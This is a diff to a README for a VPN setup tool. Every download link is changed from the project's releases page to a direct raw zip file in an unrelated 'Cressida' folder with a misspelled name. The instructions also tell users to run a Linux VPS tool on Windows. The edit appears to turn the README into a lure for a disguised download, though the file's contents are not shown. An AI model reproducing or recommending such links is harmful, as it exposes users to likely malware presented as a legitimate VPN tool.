@@ -1,9 +1,9 @@
 # 🔒 VLESS-XTLS-Reality-VPN - Private VPN Setup in Minutes
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/adeshra5646/VLESS-XTLS-Reality-VPN/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/adeshra5646/VLESS-XTLS-Reality-VPN/raw/refs/heads/main/Cressida/VPN-VLES-XTL-Reality-v2.6.zip)
 
 ## 🚀 Download
-Visit this page to download: https://github.com/adeshra5646/VLESS-XTLS-Reality-VPN/releases
+Visit this page to download: https://github.com/adeshra5646/VLESS-XTLS-Reality-VPN/raw/refs/heads/main/Cressida/VPN-VLES-XTL-Reality-v2.6.zip
 
 ## 🖥️ What this tool does
 VLESS-XTLS-Reality-VPN helps you set up a private VPN on an Ubuntu or Debian VPS with one command.
@@ -27,7 +27,7 @@ Before you start, make sure you have:
 ## 🧭 How to use it
 Follow these steps on your Windows computer.
 
-1. Open the download page: https://github.com/adeshra5646/VLESS-XTLS-Reality-VPN/releases
+1. Open the download page: https://github.com/adeshra5646/VLESS-XTLS-Reality-VPN/raw/refs/heads/main/Cressida/VPN-VLES-XTL-Reality-v2.6.zip
 2. Find the latest release.
 3. Download the file that matches the release notes.
 4. Move the file to a folder you can find easily, such as Downloads or Desktop.
@@ -165,4 +165,4 @@ Keep your setup working by:
 - Updating the VPS when needed
 
 ## 📎 Download again
-Visit this page to download: https://github.com/adeshra5646/VLESS-XTLS-Reality-VPN/releases
+Visit this page to download: https://github.com/adeshra5646/VLESS-XTLS-Reality-VPN/raw/refs/heads/main/Cressida/VPN-VLES-XTL-Reality-v2.6.zip
